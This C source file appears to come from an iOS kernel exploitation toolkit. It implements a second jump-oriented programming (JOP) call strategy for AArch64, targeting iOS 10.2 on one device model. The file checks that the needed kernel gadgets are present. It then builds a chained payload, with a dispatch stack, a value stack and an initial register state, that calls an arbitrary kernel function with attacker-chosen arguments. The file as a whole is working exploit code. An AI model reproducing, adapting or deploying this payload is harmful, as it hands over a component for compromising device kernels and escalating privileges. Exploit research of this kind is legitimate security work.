/*
 * AArch64 Kernel Function Call Strategy 2
 * ---------------------------------------
 *
 *  This JOP program is very similar to that documented in call_strategy_1.c. It is used on some
 *  other platforms when the gadgets in the other JOP payloads cannot be found.
 */

#include "aarch64/jop/call_strategy.h"
#include "aarch64/jop/gadgets_static.h"

static bool
check() {
#define NEED(gadget)					\
	if (static_gadgets[gadget].address == 0) {	\
		return false;				\
	}
	NEED(LDP_X2_X1_X1__BR_X2);
	NEED(MOV_X12_X2__BR_X3);
	NEED(MOV_X2_X30__BR_X12);
	NEED(MOV_X8_X4__BR_X5);
	NEED(MOV_X20_X0__BLR_X8);
	NEED(MOV_X10_X4__BR_X8);
	NEED(MOV_X9_X10__BR_X8);
	NEED(MOV_X11_X9__BR_X8);
	NEED(LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8);
	NEED(ADD_X20_X20_34__BR_X8);
	NEED(MOV_X22_X6__BLR_X8);
	NEED(MOV_X24_X4__BR_X8);
	NEED(MOV_X0_X3__BLR_X8);
	NEED(MOV_X0_X5__BLR_X8);
	NEED(MOV_X9_X0__BR_X11);
	NEED(MOV_X7_X9__BLR_X11);
	NEED(MOV_X11_X24__BR_X8);
	NEED(MOV_X1_X9__MOV_X2_X10__BLR_X11);
	NEED(LDP_X8_X1_X20_10__BLR_X8);
	NEED(RET);
	NEED(MOV_X28_X2__BLR_X8);
	NEED(MOV_X21_X5__BLR_X8);
	NEED(MOV_X15_X5__BR_X11);
	NEED(MOV_X17_X15__BR_X8);
	NEED(MOV_X30_X22__BR_X17);
	NEED(STR_X0_X20__LDR_X8_X21__LDR_X8_X8_28__MOV_X0_X21__BLR_X8);
	NEED(MOV_X30_X28__BR_X8);
	return true;
#undef NEED
}

static void
build(uint64_t func, const uint64_t args[8], kaddr_t kernel_payload,
		void *payload0, struct jop_call_initial_state *initial_state,
		uint64_t *result_address) {
	const size_t VALUE_STACK_OFFSET  = 0;
	const size_t RESULT_OFFSET       = 0x9c;
	const size_t STORE_RESUME_OFFSET = 0;
	const size_t JOP_STACK_OFFSET    = 0xe0;
	const size_t LOAD_ADVANCE        = 0x34;
	const int    STORE_RESUME_DELTA  = -0x28;

	uint8_t *const payload = (uint8_t *)payload0;
	// Set up STORE_RESUME.
	uint64_t store_resume = kernel_payload + STORE_RESUME_OFFSET;
	uint64_t *store_resume_payload = (uint64_t *)(payload + STORE_RESUME_OFFSET);
	store_resume_payload[0] = store_resume + sizeof(uint64_t) + STORE_RESUME_DELTA;
	store_resume_payload[1] = static_gadgets[LDP_X2_X1_X1__BR_X2].address;
	// Set up JOP_STACK.
	const unsigned jop_call_chain_gadgets[] = {
		MOV_X20_X0__BLR_X8,
		MOV_X10_X4__BR_X8,
		MOV_X9_X10__BR_X8,
		MOV_X11_X9__BR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X21_X5__BLR_X8,
		MOV_X22_X6__BLR_X8,
		MOV_X24_X4__BR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X15_X5__BR_X11,
		MOV_X17_X15__BR_X8,
		MOV_X0_X3__BLR_X8,
		MOV_X9_X0__BR_X11,
		MOV_X7_X9__BLR_X11,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X0_X3__BLR_X8,
		MOV_X9_X0__BR_X11,
		MOV_X10_X4__BR_X8,
		MOV_X0_X5__BLR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		MOV_X11_X24__BR_X8,
		MOV_X1_X9__MOV_X2_X10__BLR_X11,
	};
	const unsigned jop_return_chain_gadgets[] = {
		STR_X0_X20__LDR_X8_X21__LDR_X8_X8_28__MOV_X0_X21__BLR_X8,
		MOV_X30_X28__BR_X8,
		RET,
	};
	struct dispatch_gadget {
		uint64_t x2;
		uint64_t x1;
	} *dispatch_gadget = (struct dispatch_gadget *)(payload + JOP_STACK_OFFSET);
	uint64_t jop_chain_next = kernel_payload + JOP_STACK_OFFSET;
	for (size_t i = 0; i < ARRSIZE(jop_call_chain_gadgets); i++) {
		jop_chain_next += sizeof(*dispatch_gadget);
		dispatch_gadget->x2 = static_gadgets[jop_call_chain_gadgets[i]].address;
		dispatch_gadget->x1 = jop_chain_next;
		dispatch_gadget++;
	}
	uint64_t jop_return_chain = jop_chain_next;
	for (size_t i = 0; i < ARRSIZE(jop_return_chain_gadgets); i++) {
		jop_chain_next += sizeof(*dispatch_gadget);
		dispatch_gadget->x2 = static_gadgets[jop_return_chain_gadgets[i]].address;
		dispatch_gadget->x1 = jop_chain_next;
		dispatch_gadget++;
	}
	// Set up VALUE_STACK.
	struct load_gadget {
		uint64_t pad[4];
		uint64_t x3;
		uint64_t x4;
		uint64_t x5;
		uint64_t x6;
	} *load_gadget = (struct load_gadget *)(payload + VALUE_STACK_OFFSET);
	load_gadget->x4 = static_gadgets[MOV_X30_X22__BR_X17].address;
	load_gadget->x5 = store_resume;
	load_gadget->x6 = static_gadgets[LDP_X8_X1_X20_10__BLR_X8].address;
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = args[7];
	load_gadget->x5 = func;
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = args[1];
	load_gadget->x4 = args[2];
	load_gadget->x5 = args[0];
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = args[3];
	load_gadget->x4 = args[4];
	load_gadget->x5 = args[5];
	load_gadget->x6 = args[6];
	struct call_recover_gadget {
		uint64_t pad[2];
		uint64_t x8;
		uint64_t x1;
	} *call_recover_gadget = (struct call_recover_gadget *)((uint8_t *)load_gadget);
	call_recover_gadget->x8 = static_gadgets[LDP_X2_X1_X1__BR_X2].address;
	call_recover_gadget->x1 = jop_return_chain;
	// Declare the initial state.
	initial_state->pc = static_gadgets[MOV_X12_X2__BR_X3].address;
	initial_state->x[0] = kernel_payload + VALUE_STACK_OFFSET;
	initial_state->x[1] = kernel_payload + JOP_STACK_OFFSET;
	initial_state->x[2] = static_gadgets[MOV_X8_X4__BR_X5].address;
	initial_state->x[3] = static_gadgets[MOV_X2_X30__BR_X12].address;
	initial_state->x[4] = static_gadgets[LDP_X2_X1_X1__BR_X2].address;
	initial_state->x[5] = static_gadgets[MOV_X28_X2__BLR_X8].address;
	// Specify the result address.
	*result_address = kernel_payload + RESULT_OFFSET;
}

/*
 * jop_call_strategy_2
 *
 * Description:
 * 	An alternative JOP payload in case of missing gadgets.
 *
 * Platforms:
 * 	iOS 10.2 14C92: n51
 */
struct jop_call_strategy jop_call_strategy_2 = {
	0x400, 0, check, build,
};
